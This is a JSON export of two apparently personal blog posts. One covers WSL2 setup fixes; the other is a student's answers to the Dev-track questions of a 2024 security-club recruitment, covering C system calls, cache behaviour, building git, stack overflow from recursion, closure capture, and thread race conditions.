{"posts":[{"title":"Windows Subsystem for Linux","text":"Penguins would not like open Windows. 本文记录了我启动🐧WSL2遇到的各种报错和问题的解决方法。 Windows家庭中文版升级为专业版1. win11家庭版转专业版密钥 2. windows11家庭版升级专业版 按照文章1的步骤，密钥第四个可以，输入后自动重启升级。升级后我的显示密钥无效未激活，在终端中输入文章2第二步的三个命令，查看发现升级成功。 启用或关闭Windows功能中没有Hyper-vWindows 没有 Hyper-V 解决方案 WSL2安装Linux发行版开启 WSL2 安装 Ubuntu 当我一切工作准备就绪，使用wsl --update命令升级到最新版的wsl后，仍然出现了错误。 1Error code: Wsl/Service/CreateVm/HCS/HCS_E_HYPERV_NOT_INSTALLED Google后发现有人遇到了和我同样的问题，onomatopellan的回答“勾选Windows Sandbox选项”帮助了我。 使用 wsl --list --online 命令查找可用发行版名称，并用 wsl --install -d &lt;distribution_name&gt; 安装你喜爱的版本。 移动发行版的安装位置。默认情况下 WSL 会安装在 C 盘中，从而占用较大的磁盘空间，可以将其移动到其它位置，例如 D:\\WSL下。 导出到 D 盘中：wsl --export Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tar； 注销并移除 C 盘中的发行版：wsl --unregister Ubuntu； 导入到 D 盘中：wsl --import Ubuntu D:\\WSL\\Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tar。","link":"/2024/07/21/Windows-Subsystem-for-Linux/"},{"title":"CNSS Recruit Dev 2024","text":"“Dev 可以成为你创造万物的途径之一，这将伴随巨大的成就感。” 被Guideline吸引，凝聚网络安全工作室2024年💻Dev方向的招新题目，自己的wp。 Problems covered： 操作系统 计算机网络 并行优化 Web … 🥳MAN！作为一名Dev手，学会查找并浏览官方文档是非常重要的能力。本题要求你初步学会使用linux系统自带的一个功能强大的文档：man 。(实际上是manual的英文缩写） 之前没有用过linux？没有关系，来看一下这门课程吧：https://missing-semester-cn.github.io/ CH1首先，你要在电脑上配置一个虚拟环境，这里列出几个方案: 在windows环境下可以使用wsl（比较推荐） 或者可以配置虚拟机 或者有条件可以找一台云服务器或者买另一台实体机。 双系统（步骤比较复杂） 当我们有了linux环境后，不妨在linux环境下使用gcc编译一个自己写的”Hello World!”并运行！ CH2linux有一个很有意思的指令：strace。同时，linux中的指令(command)，系统调用(system call)和库函数(library function) 基本都可以用man 1 [name], man 2 [name] man 3 [name]来了解他们的用法。 假设你在CH1中的程序名为hello。在同目录下运行strace ./hello。结合你看到的man上对strace的阐述，简单解释下运行结果。 In the simplest case strace runs the specified command until it exits. It intercepts and records the system calls which are called by a process and the signals which are received by a process. The name of each system call, its arguments and its return value are printed on standard error or to the file specified with the -o option. 输出展示了程序的执行过程。 execve调用hello_world，传递了PATH、参数和42个环境变量；返回0，成功执行。 brk查询程序数据段末尾位置，返回值是当前内存分配位置，用于管理内存。 mmap为程序分配一块内存，返回分配的内存地址，用于读写操作。 access在检查是否存在ld.so.preload文件，返回错误，没有找到。 openat打开共享库缓存文件，查找程序依赖的共享库；当前程序依赖的libc库被打开，程序返回3。 read、mmap和close表示从库中读取需要的数据。 arch_prctl设置线程本地存储，为多线程环境提供支持。（不懂） set_tid_address和set_robust_list用于线程的初始化、设置线程的标识地址，防止线程被意外中断。（也不懂） mprotect保护内存页面的权限，设置某些内存区域为只读。 （大的要来了）write(1, &quot;hello_world\\n&quot;, 12) = 12，通过write系统调用向文件描述符1即标准输出写入12个字节的字符串。 exit_group顾名思义，结束并正常退出。 +++ exited with 0 +++ CH3运行 man 3 exec。你能写一个运用到了库函数exec的C程序吗？ The exec() family of functions replaces the current process image with a new process image. 写程序调用execve来替换当前的进程。CH2的第一个调用。 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt; //execve所在的头文件extern char **environ; // 引用当前进程的环境变量int main() { // 要执行的程序的路径 char *program = &quot;/bin/ls&quot;; // 参数 char *args[] = {&quot;ls&quot;, NULL}; // 执行 execve 系统调用 if (execve(program, args, environ) == -1) { perror(&quot;execve met problems.&quot;); exit(EXIT_FAILURE); // 使用 EXIT_FAILURE 表示失败退出 } return 0;} 编译和运行这个程序。 12345$ gcc -o execve_exp execve_exp.c$ ./execve_expexecve_exp execve_exp.c hello_world test.c$ lsexecve_exp execve_exp.c hello_world test.c 😶‍🌫️Oop Loop学习c语言的数组部分时，想出了三种遍历二维数组的方法，并想办法测量了这三种方法所使用的时间。”这三种方法都访问了同样数量的数组元素，因此他们所耗费的时间一定是差不多的。“但事情远没有这么简单： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday st\\n&quot;); exit(1); } return ;}#define ArrSize 15000int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { /* Evaluate iterating pattern 1 */ struct timeval tv_st; M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } struct timeval tv_ed; M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 2 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 3 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j+=3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); printf(&quot;time spent for time_gap1: %lf seconds\\n&quot;, time_gap1); printf(&quot;time spent for time_gap2: %lf seconds\\n&quot;, time_gap2); printf(&quot;time spent for time_gap3: %lf seconds\\n&quot;, time_gap3);} 事实上，这三种遍历方式使用的时间有明显的差别。 CH1发现每次程序的运行结果差别都很大，因此需要反复运行程序很多次才能找出不同遍历模式下的时间规律。请你帮他修改程序，让程序的运行结果随机性更小，这样就能找出更加可信的结论了！ 实践出真知，跑一下看看。Oops，感觉1和3的随机性很强，2几乎是最慢的，不过也有少数例外。为了减少随机性，我们可以多次跑代码取平均值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0#define ArrSize 15000#define NUM_RUNS 5 //运行5次并取平均值void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday failed\\n&quot;); exit(1); }}int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { double total_time1 = 0.0, total_time2 = 0.0, total_time3 = 0.0; for(int run = 0; run &lt; NUM_RUNS; run++) { struct timeval tv_st, tv_ed; M_gettimeofday(&amp;tv_st); /* PATTERN 1 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time1 += time_gap1; M_gettimeofday(&amp;tv_st); /* PATTERN 2 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time2 += time_gap2; M_gettimeofday(&amp;tv_st); /* PATTERN 3 */ for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j += 3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time3 += time_gap3; } printf(&quot;Average time spent for time_gap1: %lf seconds\\n&quot;, total_time1 / NUM_RUNS); printf(&quot;Average time spent for time_gap2: %lf seconds\\n&quot;, total_time2 / NUM_RUNS); printf(&quot;Average time spent for time_gap3: %lf seconds\\n&quot;, total_time3 / NUM_RUNS); return 0;} 嗯，看起来有规律多了：$2&gt;&gt;1&gt;3$。 CH2试回答不同遍历模式下运行时间的差别，并解释为什么会产生这些差别。 1是行优先遍历，这与C中行主序存储数组的方式一致。根据局部性，CPU可以有效地读取连续的内存块，减少缓存未命中次数，提高访问速度。 而2是列优先遍历，与1相反，这种访问模式导致大量缓存未命中、效率低。 关于原理解释那一部分，只靠cpu缓存其实不太能解释 第三个pattern 耗时比第一个pattern小的问题qwq——Shiver 3则使用了循环展开优化。每次处理三个元素，减少了每次更新迭代的控制开销，在大规模进行数组遍历时，会累积成明显的性能提升。 另外由于数组元素是每三个访问的，更容易预取更多数据到缓存中，进一步减少了缓存未命中的损失。 流水线优化：现代处理器使用流水线技术来提高指令执行的效率。3通过减少循环次数和增加每次循环内处理的数据量，减少了其它分支指令，使处理器流水线更顺畅。这可以减少流水线停顿，从而提高整体执行速度。 分支预测：循环的检查条件变少了，分支预测错误的概率也降低了。 可能存在的向量化优化？编译器可以自动将这种每次操作多个相邻元素转换为SIMD指令。这意味着处理器可以在一个指令周期内对多个数据进行相同的操作，提升运算速度。 连续访问多个元素更有可能保持内存对齐，从而减少额外的内存操作开销。 由于循环体内操作相互独立，处理器可以并行处理多个操作，进一步提升速度。 ♿造轮子 Git 是一个分布式版本控制系统，用于跟踪代码或文件的更改，并支持多人协作开发。 你可以在这里看到git的源代码: https://github.com/git/git Shiver想要在自己的电脑上安装git。 以前，他是通过系统的软件包管理器来安装git的。例如，在ubuntu系统中就可以使用这两行命令来安装git： 12$ sudo apt update$ sudo apt install git 但今天，它想换点新花样。他想要通过源代码来编译git！ git的源代码很多地方都有，这里比较推荐使用github上的代码仓库，并通过git clone下载。（不要吐槽为什么电脑上已经有git了为为什么还要下载git源码） 同时，Shiver还通过修改源代码实现了修改git调用版本信息后的输出。 总的来说，Shiver想要你实现如下的操作： 在自己的电脑上编译 git 程序，并在提交文档中简单阐述自己在编译过程中遇到的问题与自己是怎么解决这些问题的。 修改 git 的源代码，使其在输出版本信息时会有额外的 &lt;-- CNSS --&gt; 提示（你也可以添加自己喜欢的信息）并截图提交。（这可能需要你具有一定的代码阅读能力） Hints： 怎么编译？要不先从文档开始，比如源代码中的README.md，INSTALL文件？ 什么是cmake？ A）编译需要依赖，在GPT的帮助下怒装依赖项。 1sudo apt install -y make libssl-dev libcurl4-gnutls-dev libexpat1-dev gettext B）获取Git的源码并编译Git程序： 1234git clone git@github.com:git/git.gitmake configure./configure --prefix=/usr/local #指定安装路径，防止冲突make C）遇到报错信息： 12345678910/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_iconv':/home/aununo/CNSS/git/utf8.c:498:(.text+0x10dd): undefined reference to `libiconv'/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_len':/home/aununo/CNSS/git/utf8.c:593:(.text+0x121d): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x1252): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:593:(.text+0x129e): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x12c9): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:598:(.text+0x136b): undefined reference to `libiconv_open'collect2: error: ld returned 1 exit statusmake: *** [Makefile:2842: git-daemon] Error 1 大概是说缺少 libiconv 库的引用。libiconv 是一个用于字符编码转换的库，而 Git 在处理字符集转换时依赖于它。我们使用命令 123$ ldconfig -p | grep libiconv #检查libiconv是否成功安装 libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so 系统上有 libiconv_hook.so，而不是标准的 libiconv.so。由于 libiconv_hook 并没有提供 libiconv.so 的标准接口，导致了编译和测试时出现错误。创建符号链接： 1sudo ln -s /lib/x86_64-linux-gnu/libiconv_hook.so.1 /lib/x86_64-linux-gnu/libiconv.so.2 让系统中的 libiconv_hook.so 模拟 libiconv.so.2，验证一下： 12345$ ldconfig -p | grep libiconv libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so libiconv.so.2 (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so.2 libiconv.so (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so 然后进行make编译成功！再复现一遍。 使用的版本基于 2.46.2，并且在此版本发布后有 628 次提交。 当前版本对应的具体提交哈希是 6258f68c3c。（复现前后面还有个.dirty表示在工作目录中有未提交的更改） Git 的版本信息由 git --version 命令生成，输出git version，下面我们进行查找： 1grep -r &quot;git version&quot; . 把大量输出喂给GPT发现： 123./help.c: * with external projects that rely on the output of &quot;git version&quot;../help.c: strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);./help.c: N_(&quot;git version [--build-options]&quot;), Here it is! 在vscode中查找并编辑help.c文件，修改输出即可。 12strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);=&gt; strbuf_addf(buf, &quot;&lt;-- CNSS --&gt; git version %s I l0v3 Sh1v3r~\\n&quot;, git_version_string); 重新make一下，输出时发现后面多了一个dirty。是修改了help.c却没提交更改的缘故。 可以看到输出&lt;-- CNSS --&gt; git version 2.46.2.628.g6258f68c3c.dirty I l0v3 Sh1v3r~ ⚒️Dig and Dig ssg是一名资深的Minecraft玩家，平时最喜欢的就是在MC的辽阔土地上寻找珍贵的矿石。 CH1从原版到整合包，从我的世界到泰拉瑞亚，ssg挖矿的足迹分布在各个领域。 有一天，他突然好奇想挖挖看 C语言程序，于是他写下了这段代码： 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; printf(&quot;In depth %d, we are at %p \\n&quot;, (depth - digging), (void *) &amp;where_are_we); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth);} 他决定先向下面挖掘 10 个函数的深度，于是他将depth 变量设置为了 10 并得到了这样的结果： Today we will dig: 10Let begin!In depth 0, we are at 0x7fffbc3fea14In depth 1, we are at 0x7fffbc3fe9e4In depth 2, we are at 0x7fffbc3fe9b4In depth 3, we are at 0x7fffbc3fe984In depth 4, we are at 0x7fffbc3fe954In depth 5, we are at 0x7fffbc3fe924In depth 6, we are at 0x7fffbc3fe8f4In depth 7, we are at 0x7fffbc3fe8c4In depth 8, we are at 0x7fffbc3fe894In depth 9, we are at 0x7fffbc3fe864In depth 10, we are at 0x7fffbc3fe834 看起来不错，于是他决定继续向下挖，但不知道为什么，当 depth 足够大时，程序就终止运作了！ 因此 ssg 找到你，想请你帮他解决这些问题： 尝试修改程序，使ssg的这个程序能统计他 总共 能够向下挖掘多少个 Byte。多次运行这个程序，每次能向下挖的Byte是固定的吗？ 运行初始程序看看depth的最大值，发现每次运行得到的最大深度相近但不同。比如： 123456789101112$ ./digToday we will dig: 1000000Let begin!...In depth 174513, we are at 0x7ffcccda07a4[1] 2146 segmentation fault ./dig# ----------------------------------- #In depth 174450, we are at 0x7ffda0d677a4[1] 2165 segmentation fault ./dig# ----------------------------------- #In depth 174576, we are at 0x7ffc72f5f7a4[1] 2688 segmentation fault ./dig 第一次运行，程序在174513处崩溃，而第二次运行在174450处崩溃，操作系统为进程分配的栈空间每次可能会略有不同，因此这些深度值并不完全一致。segmentation fault的段错误发生在程序试图访问未被允许访问的内存区域时。 [1] 是Linux系统为每个后台任务分配的作业号，1表示这是当前会话的第一个后台进程。 2146和2165是进程ID，是系统为每个运行程序分配的唯一标识符。 记录一下初始地址，用where_are_we减初始地址得到所在深度： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void *initial_address = NULL;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; if (initial_address == NULL) { initial_address = &amp;where_are_we; } int current_depth_bytes = abs((char *) initial_address - (char *) &amp;where_are_we); printf(&quot;In depth %d, we are at %p, depth in bytes: %d \\n&quot;, (depth - digging), (void *) &amp;where_are_we, current_depth_bytes); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth); return 0;} 运行一下程序： 1234567$ ./digToday we will dig: 100Let begin!In depth 0, we are at 0x7ffdd7afae10, depth in bytes: 0In depth 1, we are at 0x7ffdd7afade0, depth in bytes: 48...In depth 100, we are at 0x7ffdd7af9b50, depth in bytes: 4800 发现每次能向下挖的字节数是固定的48字节。 尝试解释为什么depth足够大时程序会停止运行。 递归深度过深，发生了栈溢出。函数的递归调用会在栈上分配内存，而栈的大小是有限的。当递归深度超出系统分配给程序的栈内存时，程序就会发生栈溢出，从而导致程序崩溃。 尝试解释为什么每次层数的间隔都为 48Byte, 这48Byte里面都包含了些什么？ 函数调用过程中的栈帧结构，说明这个函数中一个栈帧大小为48byte。包含：函数的返回地址，局部变量，函数参数等。 比如将函数内部的局部变量where_are_we类型改为long时，层数间隔会变为64byte。 CH2ssg在挖矿的时候是左右手交替进行的，因此他想记录下自己在挖掘每一层时使用的是左手还是右手，于是他写下了这段代码： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;int depth;char* WhichHand(bool hand) { return hand ? &quot;left hand&quot; : &quot;right hand&quot;;}bool Dig1 (int digging) { if( digging &lt; 0) { return 0; } bool now_hand = !Dig1(digging - 1); printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(now_hand)); return now_hand;}bool Dig2 (int digging, bool hand) { if( digging &lt; 0) { return hand; } printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(hand)); return Dig2(digging - 1, !hand);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig1(depth); //Dig2(depth, 0);} Dig1和Dig2是他编写的两个不同版本但是效果相似的函数，看起来运行的不错： Today we will dig: 10Let begin!In depth 10, we use left handIn depth 9, we use right handIn depth 8, we use left handIn depth 7, we use right handIn depth 6, we use left handIn depth 5, we use right handIn depth 4, we use left handIn depth 3, we use right handIn depth 2, we use left handIn depth 1, we use right handIn depth 0, we use left hand 但ssg发现了一个很严重的问题，当他使用 O2 优化(即在gcc编译时添加-O2指令)分别编译运行了两个不同版本的函数后，有一个版本的函数，无论他将深度设置为多大，都可以正常运行！ 他现在想考考你: 哪个版本的函数无论设置多大的深度都可以正常运行？ dig2函数。我们来跑一下： 12345678910111213141516$ gcc -O2 -o dig1 dig1.c #O2优化启用了包括-Wunused-result在内的警告，检查scanf返回值dig1.c: In function ‘main’:dig1.c:34:5: warning: ignoring return value of ‘scanf’ declared with attribute ‘warn_unused_result’ [-Wunused-result] 34 | scanf(&quot;%d&quot;, &amp;depth); |$ ./dig1Today we will dig: 1000000Let begin![1] 1727 segmentation fault ./dig# ----------------------------------- #$ ./dig2Today we will dig: 1000000Let begin!...In depth 999999, we use left handIn depth 1000000, we use right hand 为什么？ dig1函数仍然是使用了普通递归的方式，即使开O2优化编译，栈空间的限制依然存在。 而dig2函数使用尾递归，大多数编译器，比如这里的gcc中，开了O2尾递归可以被优化为普通循环实现，每次递归不需要额外占用栈帧，只需将函数参数改变再调用一次，就不会触发栈溢出。 谈一谈这道题对你在实际项目开发中的启发。 用递归，深度较大时，警惕栈溢出； 合理使用尾递归； 了解编译器和语言的优化能力，有助于提高程序的运行效率； developers应当编写健壮的代码，做好代码测试，关注边界条件。 🧮Primes香肠非常痴迷于筛法求素数表，大致原理如下 于是他先用 JavaScript 编写了下面这样的代码 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (x % p) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} 程序成功打印了 100 以内的所有素数。 为了让更多人理解这段代码，他又编写了 Python 版本 123456789101112131415161718def iota(i, n): while i &lt; n: yield i i += 1def filter(g, p): for x in g: if x % p: yield xg = iota(2, 100)try: while True: value = next(g) g = filter(g, value) print(value)except StopIteration: pass 程序虽然正确，但 IDE 给出了警告：用户定义的 filter 函数隐藏了 Python 内置的 filter 函数。 说来也是，为什么不直接使用更泛化的内置 filter 函数呢？于是他又把程序改成了这样。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming: incoming % value, g) print(value)except StopIteration: pass 很遗憾的是，程序输出的结果不再正确。到底是哪里出了问题？ 在调试的过程中，香肠觉得不能光调 Python 代码，JavaScript 的也不能放过。 考虑到 Python 采用了更泛化 filter 函数，于是他把原 JavaScript 代码也改成了这样。 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} 竟然出现了和第二份 Python 代码一样的错误输出结果。这是巧合吗？ 本题筛素数的协程叫什么协程？你能简单描述一下这样筛素数的过程吗？ 在JavaScript或Python中，利用惰性求值的生成器，可以逐步生成一个序列，并能在筛选过程中动态修改序列，避免占用过多计算资源。 1234567g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} 核心思想是埃拉托斯特尼筛法（Sieve of Eratosthenes）。生成器iota生成一个从2到99的整数序列g，每次调用g中的值并通过生成器filter筛掉素数value的倍数，输出value，再移动到下一个数进行循环。 为什么第二份 Python 和第二份 JavaScript 的代码有问题？两者的问题是一样的吗？ 请你在第二份 Python 和第二份 JavaScript 基础上修改代码，在不失一般性的情况下解决存在的问题。 两者的问题不一样。 Python是和其延时绑定的机制有关。Python在真正执行函数（如lambda）的时候才会查找变量的值，而不是在定义函数时。 1g = filter(lambda incoming: incoming % value, g) 而在同一个作用域下，value的值始终针对同一个变量在变化，而不是每次循环都创建一个新变量。因此，所有的lambda中引用的value都会使用最新的值。 可以采用默认参数的方法解决这个问题。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming, value=value: incoming % value, g) print(value)except StopIteration: pass 这样，参数只会初始化一次，而在之后的循环中保持不变。 手动即时捕获。 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter((lambda value: lambda incoming: incoming % value)(value), g) print(value)except StopIteration: pass 而JavaScript是与var的作用域规则有关。var在JavaScript中的作用域是函数作用域，而不是块作用域。循环体中每次声明的value实际上会在整个函数的作用域中共享，lambda函数捕获的是对同一个变量的引用，所以value会在每次循环后更新。 可以使用 let 代替 var。 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { let {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} 因为 let 是块作用域，在每次循环中会为 value 绑定一个新的变量，这样每个 lambda 函数都能捕获到当前循环中的 value，而不是共享的全局变量。 ⭐数数 计算机往往不够聪明（或者太过聪明），以至于他只会完全按照你的指令办事，尽管有时候你自己都不知道自己的指令是什么含义 CH1这道题目并不难，你要做的只是让计算机学会数数而已。 比如： 123456789101112131415161718192021222324252627#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); int counter; worker(&amp;counter); worker(&amp;counter); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 十分简单对吧？但是柳苏明却认为，让同一个 worker函数运行两遍效率太低了。为什么不雇佣两个 worker， 让他们同时工作呢？换句话说，他决定使用 多线程！ 于是他十分好心的给了你两份代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// V1#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter1, counter2; pthread_create(&amp;thread1, NULL, worker, &amp;counter1); pthread_create(&amp;thread2, NULL, worker, &amp;counter2); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter1 + counter2); return 0;}//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 但问题出现了，尽管第一份代码可以正常运行，但第二份代码在 输入值很大 时总是出现奇怪的偏差。 尝试运行测试这两段代码，回答： 为什么两份相似的代码会有不同的输出结果？ V1中每个线程独立地操作各自的counter1和counter2，互不干扰，最终把两个计数器的结果加和得到答案。 V2中通过多线程并发地对同一变量counter进行修改，这种操作存在竞争条件。意味着两个线程可能同时读写共享变量counter，导致计数不准确，尤其是在工作负荷较大的时候。 在编写多线程代码时，如何避免这种错误？ 引入同步机制，使用互斥锁来保证线程的独立访问，确保在同一时刻只有一个线程可以操作变量，避免竞争条件。 尝试只修改 worker 函数来使第二份代码输出正确。 123456789101112131415161718192021222324252627282930313233343536//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load; pthread_mutex_t lock; //锁的声明void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { pthread_mutex_lock(&amp;lock); //上锁 (* (int *)counter_ptr) += 1; pthread_mutex_unlock(&amp;lock); //解锁 } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_mutex_init(&amp;lock, NULL); //锁的初始化 pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); pthread_mutex_destroy(&amp;lock); //销毁 printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 运行一下，对比更改前后： 1234567$ ./countgive the workload per thread: 1000000000Totally count: 1007291379#------------------------------------------#$ ./countgive the workload per thread: 1000000000Totally count: 2000000000 CH2了解”互斥锁”这个概念，思考： 两个线程都同时访问了同一个变量：互斥锁 对于互斥锁的访问难道不会产生数据竞争吗？ 回答: 为什么访问互斥锁不会产生数据竞争？ 请尝试自己编写一个互斥锁(额外加分) 【操作系统】锁的实现 当一个线程获取互斥锁时，其他线程尝试获取必须等待，直到当前线程释放锁。互斥锁的实现由底层硬件或操作系统支持，通常通过某种原子操作，当一个线程访问其他线程持有的锁时，会被 OS 调度为阻塞状态（休眠），直到锁被释放后，再唤醒一个休眠的线程。 （另外，自旋锁是一种忙等待锁。它在锁被其他线程持有时不会阻塞当前线程，而是不断地尝试获取锁，直到锁可用为止。这种忙等待的行为称为“自旋”。） 使用了原子操作来实现互斥锁的加锁和解锁逻辑。 1234567891011121314151617typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield() //挂起，而非忙等待 } }void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);} 完整代码： 